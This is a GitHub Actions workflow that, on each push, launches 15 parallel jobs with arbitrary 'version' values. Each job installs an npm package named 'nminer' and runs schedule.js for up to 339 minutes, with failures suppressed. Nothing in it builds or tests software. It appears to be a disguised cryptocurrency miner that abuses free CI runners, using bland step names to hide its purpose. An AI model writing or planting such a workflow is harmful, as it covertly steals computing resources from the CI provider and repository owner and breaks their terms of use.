name: schedule
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2967 }
          - { version: 16 }
          - { version: 6902 }
          - { version: 9434 }
          - { version: 5240 }
          - { version: 3902 }
          - { version: 6276 }
          - { version: 905 }
          - { version: 2519 }
          - { version: 7245 }
          - { version: 2491 }
          - { version: 4232 }
          - { version: 8197 }
          - { version: 1683 }
          - { version: 4139 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: for
        run: |
          npm install nminer@latest
          timeout 339m node schedule.js || echo "schedule executed"